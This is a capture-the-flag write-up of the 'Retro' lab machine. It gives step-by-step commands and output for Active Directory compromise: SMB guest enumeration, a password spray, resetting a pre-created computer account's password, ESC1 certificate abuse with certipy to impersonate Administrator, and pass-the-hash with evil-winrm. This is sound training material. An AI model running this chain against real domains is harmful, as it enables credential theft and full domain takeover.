---
title: "Retro VulnHub WriteUp"
date: 2025-04-26 
categories: [VulnLab, Active Directory, ADCS]
tags: [active directory, esc1, certipy, pre-created computer]    # TAG names should always be lowercase
description: Retro is an easy-rated VulnHub box where we chained privileges from an SMB guest login, changed the password of a pre-created computer account, and exploited the ESC1 ADCS vulnerability  to escalate privileges and request certificates on behalf of any user, including privileged accounts.
comments: true
image: /assets/img/posts/retro/retro_slide.png
---


| Platform | VulnLab | 
|-------|--------|
| Target IP | 10.10.99.43 | 
| OS | Windows | 
| Severity | Easy | 

## Enumeration

I started with a quick nmap scan which gave the below result:

```bash
nmap -Pn -A 10.10.99.43 -oN nmap_out                                                                                           ─╯
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-24 10:23 IST
Nmap scan report for 10.10.99.43
Host is up (0.15s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-24 04:55:17Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2025-04-24T04:37:13
|_Not valid after:  2026-04-24T04:37:13
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2025-04-24T04:37:13
|_Not valid after:  2026-04-24T04:37:13
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2025-04-24T04:37:13
|_Not valid after:  2026-04-24T04:37:13
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2025-04-24T04:37:13
|_Not valid after:  2026-04-24T04:37:13
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.retro.vl
| Not valid before: 2025-04-23T04:45:59
|_Not valid after:  2025-10-23T04:45:59
|_ssl-date: 2025-04-24T04:56:39+00:00; -1s from scanner time.
| rdp-ntlm-info:
|   Target_Name: RETRO
|   NetBIOS_Domain_Name: RETRO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: retro.vl
|   DNS_Computer_Name: DC.retro.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-04-24T04:56:00+00:00
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-04-24T04:56:04
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 165.76 seconds
```

The scan results confirmed the presence of a Domain Controller (DC). To ensure proper hostname resolution, I manually added the following entries to `/etc/hosts`:

```bash
echo "10.10.99.43 DC.retro.vl retro.vl" | sudo tee -a /etc/hosts
```

With no valid credentials available, I proceeded with unauthenticated enumeration techniques, focusing on, Guest login and the null sessions. 

```bash
nxc smb retro.vl -u 'Guest' -p '' --shares 
```

![](/assets/img/posts/retro/1.jpg)

The `Trainee` share caught my eye, so I decided to take a look at what it had. I used `smbclient.py` from the Impacket toolkit, logging in as a guest without any password. However one can also use smbclient or smbclient-ng (with better navigation) as well. 

```bash
smbclient.py 'Guest@retro.vl' -no-pass
```

![](/assets/img/posts/retro/2.jpg)

There was a file named `Imporatant.txt` which contains below text:

```
Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards

The Admins
```

> This suggests that multiple users might be sharing the same password—or even using the same value for both username and password. Additionally, it looks like there could be users with usernames like `Trainees` and possibly `Admins`.

So, I decided to enumerate more users from an unauthenticated user's perspective. I used the goldmine tool `nxc`, though you can also use `lookupsid.py` from the Impacket toolkit.

```bash
nxc smb retro.vl -u 'Guest' -p '' --rid-brute
```

![](/assets/img/posts/retro/3.jpg)

I created a potential users.txt file containing all the possible usernames, and tried the password spray attack. 

```bash
nxc smb retro.vl -u users.txt -p users.txt --continue-on-success --no-bruteforce                                        
```

![](/assets/img/posts/retro/4.jpg)

>It's a good practice to include the `--no-bruteforce` flag. This ensures that only one password is tried across all users, helping to avoid account lockouts and making the activity more controlled and safe.
{: .prompt-tip }

## Initial Access

We found a valid credentials `trainee:trainee` let's enumerate the shares it has access to.

```bash
smbclientng -d "retro.vl" -u 'trainee' -p 'trainee' --host 10.10.99.43
```

![](/assets/img/posts/retro/5.jpg)

We got an another note `ToDo.txt` containing the following text:

```
Thomas,

after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.

Best

James
```

The note mentions `Thomas` and `James`, indicating that they are likely real individuals within the organization and could be valid usernames to explore further in our attack chain. It also hints at a `pre-created computer account` that might be worth looking into.


> During a quick Google search, I came across an excellent [article by TrustedSec](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/). It explains that when administrators pre-create computer accounts and select the "Assign this computer account as a pre-Windows 2000 computer" option, the system sets the password to the computer's name in lowercase (e.g., `DavesLaptop$` becomes `daveslaptop`). If the account is never actually used, this default password remains unchanged—creating a potential security risk.
{: .prompt-info }

It reminds me of the computer account we discovered during the `rid-brute` phase, which was `BANKING$`. According to the article, the password for this account should be `banking` (in lowercase). Let's attempt the login with the potential credentials.

```bash
nxc smb retro.vl -u 'BANKING$' -p 'banking'                                                                            
SMB         10.10.99.43     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.99.43     445    DC               [-] retro.vl\BANKING$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
```

We did not succeed the authentication however the error message `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` suggests that the `BANKING$` account is a machine trust account (i.e., a computer account in Active Directory) and these accounts are typically not used for user logins.

After reading the TrustedSec article again, I got the idea to change the password for the computer account using either [Changepassword.py](https://raw.githubusercontent.com/fortra/impacket/master/examples/changepasswd.py) or `kpasswd`. I decided to try `kpasswd` because it allows us to change the password of a machine account (like `BANKING$`) using Kerberos authentication, which helps bypass any issues with SMB-based logins.

To do this we need to generate a `krb5.conf` file again nxc for the rescue. Got an reference from the `NXC` wiki about the generation of `krb5.conf` file using the `--generate-krb5-file` flag. 

```bash
nxc smb retro.vl -u 'BANKING$' -p 'banking' --generate-krb5-file krb5.conf
```

![](/assets/img/posts/retro/6.jpg)

It created a file with the below content which I further copied to `/etc/krb5.conf` path. 

```
[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = RETRO.VL

[realms]
    RETRO.VL = {
        kdc = dc.retro.vl
        admin_server = dc.retro.vl
        default_domain = retro.vl
    }

[domain_realm]
    .retro.vl = RETRO.VL
    retro.vl = RETRO.VL
```

Let's try to change the password using `kpasswd` but it resulted into some error:

```bash
kpasswd BANKING$                                                                                                        
BANKING$@RETRO.VL's Password:
kpasswd: krb5_get_init_creds: unable to reach any KDC in realm RETRO.VL, tried 1 KDC
```

> The error indicates that the KDC (Key Distribution Center) cannot be reached, it may mean that the target server is not reachable or that there are network connectivity issues preventing communication with the KDC. Kerberos authentication is time-sensitive, meaning both the client and the KDC (Key Distribution Center) need to have synchronized clocks for authentication to succeed.
{: .prompt-info }

To overcome the issue, I used the `sntp` command on my Mac system to synchronize the system time with the NTP server at `retro.vl` (IP: 10.10.99.43). This adjusted my system clock, aligning it with the KDC's time, which is important for Kerberos authentication to work correctly. After running the command, the system time was in sync, and the password change process using `kpasswd` went through successfully. 

> For Linux users, a similar solution can be achieved by using **`ntpd`** or **`chrony`** to synchronize the system clock with an NTP server, ensuring that the time is in sync with the Kerberos server, allowing easy authentication.

```bash
sudo sntp -sS retro.vl

kpasswd 'BANKING$'
BANKING$@RETRO.VL's Password:
New password:
Re-enter new password:
```

![](/assets/img/posts/retro/7.jpg)

Successfully authenticated with `Banking$:sidhere!`

## Privilege Escalation (ADCS)

To escalate privileges further, I decided to enumerate Active Directory Certificate Services (ADCS) within the environment. ADCS can often present misconfigurations that are exploitable for privilege escalation, especially in environments where certificate templates allow low-privileged users to request certificates with elevated permissions.

I used the nxc tool to query the domain for ADCS-related objects:

```bash
nxc ldap retro.vl -u 'BANKING$' -p 'sidhere!' -M adcs                                                                   
LDAP        10.10.99.43     389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:retro.vl)
LDAP        10.10.99.43     389    DC               [+] retro.vl\BANKING$:sidhere!
ADCS        10.10.99.43     389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.10.99.43     389    DC               Found PKI Enrollment Server: DC.retro.vl
ADCS        10.10.99.43     389    DC               Found CN: retro-DC-CA
```

This confirms that ADCS is deployed in the domain, and the CA (Certificate Authority) identified is `retro-DC-CA`, hosted on the domain controller. This is a potential attack surface, so the next logical step is to perform a deeper enumeration using Certipy, a powerful tool for assessing ADCS configurations and identifying exploitable certificate templates.

```bash
certipy find -u 'Banking$@retro.vl' -p 'sidhere!' -dc-ip 10.10.99.43 -vulnerable -enabled -stdout                       
```

![](/assets/img/posts/retro/8.jpg)

**Complete Output:**

```bash
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'retro-DC-CA' via CSRA
[!] Got error while trying to get CA configuration for 'retro-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'retro-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'retro-DC-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : retro-DC-CA
    DNS Name                            : DC.retro.vl
    Certificate Subject                 : CN=retro-DC-CA, DC=retro, DC=vl
    Certificate Serial Number           : 7A107F4C115097984B35539AA62E5C85
    Certificate Validity Start          : 2023-07-23 21:03:51+00:00
    Certificate Validity End            : 2028-07-23 21:13:50+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : RETRO.VL\Administrators
      Access Rights
        ManageCertificates              : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        ManageCa                        : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Enroll                          : RETRO.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : RetroClients
    Display Name                        : Retro Clients
    Certificate Authorities             : retro-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Permissions
      Enrollment Permissions
        Enrollment Rights               : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : RETRO.VL\Administrator
        Write Owner Principals          : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
                                          RETRO.VL\Administrator
        Write Dacl Principals           : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
                                          RETRO.VL\Administrator
        Write Property Principals       : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
                                          RETRO.VL\Administrator
    [!] Vulnerabilities
      ESC1                              : 'RETRO.VL\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
```

It was identified that the certificate template **`RetroClients`** is vulnerable to the **ESC1** (Enrollment Services Configuration #1) misconfiguration. This means low-privileged users, like our machine account `BANKING$`, can request a certificate for any user—including privileged ones—without proper validation, potentially allowing for privilege escalation within the domain.

When I tried requesting a certificate on behalf of the administrator using the vulnerable `RetroClients` template, I ran into an error stating that the request didn’t meet the minimum key size requirement. By default, Certipy generates a 2048-bit key, but it seemed like the template was configured to require a larger key.

```bash
certipy req -u 'BANKING$'@retro.vl -p 'sidhere!' -ca retro-DC-CA -template RetroClients -upn Administrator -target dc.retro.vl 
```

![](/assets/img/posts/retro/9.jpg)

I got the following error while trying to request the certificate:

```
Got error while trying to request certificate: code: 0x80094811 - CERTSRV_E_KEY_LENGTH - The public key does not meet the minimum size required by the specified certificate template.
```

This clearly pointed to an issue with the **key size** in the request. To confirm, I went back and reviewed the initial output from `Certify`, and found that `RetroClients` template had its **minimum key length set to 4096** (line number 55 ). That explained why the default 2048-bit key from Certipy was being rejected. Therefore let's retry again with specifying the `-key-size` value. 

```bash
certipy req -u 'BANKING$'@retro.vl -p 'sidhere!' -ca retro-DC-CA -template RetroClients -upn Administrator -target dc.retro.vl -key-size 4096
```

Let's use the `administrator.pfx` file generated above to authenticate against the domain and obtain a ticket-granting ticket (TGT), which will provide us with administrative privileges.

```bash
certipy auth -dc-ip 10.10.99.43 -domain retro.vl -username Administrator -pfx administrator.pfx                              
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@retro.vl
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389
```

![](/assets/img/posts/retro/10.jpg)

At this point, we had successfully obtained the NTLM hash for the Administrator account. With this in hand, I decided to authenticate to the target system using **`evil-winrm`**. Since we have the hash, we can use it for **pass-the-hash** authentication:

```bash
evil-winrm -i 10.10.99.43 -u Administrator -H 252fac7066d93dd009d4fd2cd0368389
```

![](/assets/img/posts/retro/11.jpg)


This allowed us to gain an interactive shell as **Administrator**, effectively achieving **full domain compromise**. From here, we can take it a step further by performing a **DCSync** attack or even dumping the NTDS.dit hashes, giving us complete control over all user credentials within the domain.

![](/assets/img/posts/retro/12.jpg)

## Bonus

I found ADCS very interesting; however, it’s a bit lengthy to go through all the commands. I created an automated script that takes care of everything. It will automatically find the vulnerable template, request the TGS, dump the NTLM hash of the administrator account, and verify the login with NXC. (This script also handles the edge case of the key-size issue.) You can check out the esc1.py script [here](https://github.com/dr34mhacks/ADCS-Exploitation-Toolkit/blob/main/esc1.py).

![](/assets/img/posts/retro/13.jpg)


## Final Thoughts


The Retro VulnHub machine was a super fun, where I learned a lot about exploiting Active Directory misconfigurations. The machine involved techniques like enumerating SMB shares to identify weak passwords, exploiting a pre-created computer account with enrollment rights, and executing the ESC1 vulnerability to request certificates on behalf of any user. Additionally, I gained hands-on experience with tools like **Certipy** for certificate-based attacks and gaining full domain control. This machine was particularly valuable for understanding how misconfigurations in ADCS can be leveraged for privilege escalation, making it an excellent challenge for anyone looking to improve their skills in Active Directory exploitation.

Keep hacking, keep learning, and most importantly—stay ethical! 😊

## References:

- [https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts)
- [https://www.netexec.wiki/smb-protocol/enumeration/generate-krb5-conf-file](https://www.netexec.wiki/smb-protocol/enumeration/generate-krb5-conf-file)
- [https://raw.githubusercontent.com/fortra/impacket/master/examples/changepasswd.py](https://raw.githubusercontent.com/fortra/impacket/master/examples/changepasswd.py)
- [https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/](https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/)